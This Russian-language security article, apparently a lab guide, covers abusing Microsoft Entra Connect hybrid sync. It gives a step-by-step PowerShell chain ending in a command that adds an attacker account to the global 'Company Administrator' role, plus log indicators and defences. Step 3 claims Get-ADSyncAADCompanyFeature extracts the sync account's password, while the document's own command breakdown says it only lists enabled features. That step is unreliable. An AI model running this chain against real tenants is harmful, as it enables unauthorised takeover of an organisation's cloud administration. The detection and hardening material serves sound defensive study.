# Hybrid Active Directory Attacks — Abuse Entra ID Sync

## 🎯 Цель атаки
Эксплуатировать гибридную синхронизацию Active Directory с Entra ID (ранее Azure AD), чтобы получить контроль над облачными или локальными учётными записями, в том числе с привилегиями администратора.

## 📋 Описание
В гибридной инфраструктуре, где используется **Microsoft Entra Connect** (Azure AD Connect), локальные учётные записи синхронизируются с облачным Entra ID.  
Злоумышленник, получивший контроль над локальной AD или сервером синхронизации, может:
- повысить привилегии в облаке;
- сбросить пароли облачных учёток;
- добавить себя в облачные группы администраторов;
- обойти MFA, если оно неправильно настроено.

## ⚠ Условия эксплуатации
- Наличие гибридной интеграции AD с Entra ID через Entra Connect.
- Доступ к серверу синхронизации или учетке с правами на его управление.
- Наличие синхронизации паролей (Password Hash Sync) или Pass-Through Authentication (PTA).

## 🔹 Пошаговое проведение атаки (лаборатория)
> ⚠ Выполнять только в изолированной тестовой среде!

1. Определить сервер синхронизации:
```powershell
Get-ADSyncServerConfiguration
```
2. Проверить наличие синхронизации паролей:
```powershell
Get-ADSyncScheduler
```
3. Запустить PowerShell-скрипт для извлечения пароля учётной записи синхронизации (Microsoft 365 Directory Synchronization account):
```powershell
$aad_cred = Get-ADSyncAADCompanyFeature
$aad_cred
```
4. Использовать извлечённые учётные данные для входа в облако:
```powershell
Connect-MsolService
```
5. Повысить привилегии, добавив себя в глобальные администраторы:
```powershell
Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress attacker@contoso.com
```

## 📊 Признаки в логах и мониторинг
- Логи Entra ID / Azure AD:
  - Необычные входы с учётной записи синхронизации.
  - Изменения в ролях администраторов.
- Логи Windows Server:
  - Запуск PowerShell-команд с `Get-ADSync*`.
  - Доступ к базе данных AD Connect (`ADSync.mdf`).
- SIEM:
  - Подозрительные операции в Microsoft Graph API.
  - Создание/изменение облачных групп администраторов.

## 🛡 Меры защиты
- Ограничить доступ к серверу Entra Connect.
- Разделить учётки администраторов AD и Entra ID.
- Включить условный доступ и MFA для всех привилегированных учёток.
- Мониторить изменения в ролях и группах администраторов.
- Регулярно обновлять и патчить Entra Connect.

## 🔗 Источники
- [Microsoft: Hybrid Identity](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/)
- [Microsoft Entra Connect Security Considerations](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/how-to-connect-install-prerequisites)

---

## 🔍 Разбор команд

### 1. Получение конфигурации сервера синхронизации
```powershell
Get-ADSyncServerConfiguration
```
- Выводит настройки сервера Entra Connect, включая параметры подключения к облаку.

### 2. Проверка планировщика синхронизации
```powershell
Get-ADSyncScheduler
```
- Показывает расписание синхронизаций и включенные функции (Password Hash Sync, PTA).

### 3. Получение информации о функциях компании
```powershell
Get-ADSyncAADCompanyFeature
```
- Отображает включенные функции в Entra Connect, в том числе синхронизацию паролей.

### 4. Подключение к службе MSOL (Microsoft Online)
```powershell
Connect-MsolService
```
- Инициирует аутентификацию в облаке Microsoft 365 с указанными учётными данными.

### 5. Добавление пользователя в роль администратора
```powershell
Add-MsolRoleMember -RoleName "Company Administrator" -RoleMemberEmailAddress attacker@contoso.com
```
- Добавляет указанного пользователя в группу глобальных администраторов Entra ID (эквивалент Domain Admin в облаке).
